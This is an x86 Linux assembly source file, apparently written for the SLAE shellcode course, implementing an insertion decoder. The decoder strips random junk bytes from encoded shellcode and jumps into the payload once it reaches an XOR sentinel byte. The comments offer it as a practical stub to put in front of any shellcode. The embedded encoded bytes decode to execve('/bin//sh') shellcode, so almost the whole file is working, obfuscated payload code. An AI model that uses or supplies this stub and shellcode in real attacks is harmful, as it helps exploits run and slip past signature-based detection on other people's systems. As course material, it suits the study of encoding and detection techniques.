; Filename: random-insertion-decoder-xorkill.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; Purpose:
;	Make the insertion decoder a little more robust
;	by not caring what the secondary values are, only
;	the final one. This permits 254/255 characters
;	to be used in randomness.
;
;	If you use my version of the Insertion-Encoder.py
;	these numbers are reduced. Please read the notes
;	below for more details on possible values.
;
; Notes:
;
; At the moment we are xor bl, 0xff. So long as you stay
; outside of the ASCII range defined in the rand() call
; for Insertion-Encoder.py you can choose anything you
; want to for this value. This should help make the
; final shellcode a little more robust, as the padding
; junk is *mostly* just ascii a-zA-Z. ASCII values for
; digits may be a good choice.
;
; This file is noted as xorkill because it is an xor
; check that eventually jumps us out of the shellcode.
;
; This is probably the more practical of the two decoders
; as you can put it in front of a chunk of shellcode
; without having to put the shellcode into nasm and
; compile it. The counter can do the same but you will
; need to edit the counter byte value.
;

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor eax, eax
	mov al, 1
	xor ebx, ebx

decode: 
	mov bl, byte [esi + eax]
	xor bl, 0xff			; Instead of 0xbb we are checking for 0xff.
					; See notes above for possible values here
					;
					; IMPORTANT:
					;
					; When adding your shellcode from the
					; Insertion-Encoder.py remove the last (junk)
					; byte and replace it with whatever you are
					; xor'ing here, otherwise we will run off
					; into the stack and cause a SIGSEGV
					;

	jz short EncodedShellcode	; Only jump when we successfully xor rather
					; than always when xor's are successful.
					;
					; This permits us to have absolutely anything
					; we like in the random fields because the
					; decoder will never actually look at the
					; value beyond this xor.

	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	



call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0x58,0xc9,0x48,0xf7,0x65,0xe1,0x4f,0x50,0x72,0x68,0x6c,0x6e,0x77,0x2f,0x73,0x73,0x4a,0x68,0x57,0x68,0x69,0x2f,0x5f,0x2f,0x48,0x62,0x61,0x69,0x66,0x89,0x75,0xe3,0x70,0xb0,0x4d,0x0b,0x62,0xcd,0x72,0x80,0xff

